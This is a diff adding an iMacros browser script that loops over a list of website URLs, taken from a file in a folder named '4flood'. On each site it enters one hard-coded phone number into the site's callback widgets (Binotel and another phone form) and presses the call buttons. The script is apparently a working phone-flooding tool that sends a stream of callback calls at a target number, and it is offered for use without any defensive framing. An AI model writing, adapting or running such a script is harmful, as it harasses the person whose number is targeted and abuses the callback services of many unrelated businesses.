@@ -1,0 +1,20 @@
+﻿set !replayspeed fast
+clear
+set !timeout_tag 1
+SET !ERRORIGNORE YES
+CMDLINE !DATASOURCE C:\4flood\binotelua.txt
+SET !DATASOURCE_LINE {{!LOOP}}
+set tel "+79160797062" 
+URL GOTO={{!COL1}}
+set !replayspeed medium
+wait seconds=1
+
+TAG POS=1 TYPE=SVG ATTR=ID:bingc-phone-button-icon-icon
+SET !TIMEOUT_STEP 1
+TAG POS=1 TYPE=INPUT:TEXT FORM=ID:bingc-passive-get-phone-form ATTR=ID:bingc-passive-get-phone-form-input CONTENT={{tel}}
+TAG POS=1 TYPE=A ATTR=ID:bingc-passive-phone-form-button
+
+TAG POS=1 TYPE=DIV ATTR=CLASS:fca-ph-img-circle&&TXT:
+TAG POS=1 TYPE=INPUT:TEXT ATTR=ID:fca_phone CONTENT={{tel}}
+TAG POS=1 TYPE=INPUT:BUTTON ATTR=ID:fca_call_button
+wait seconds=1
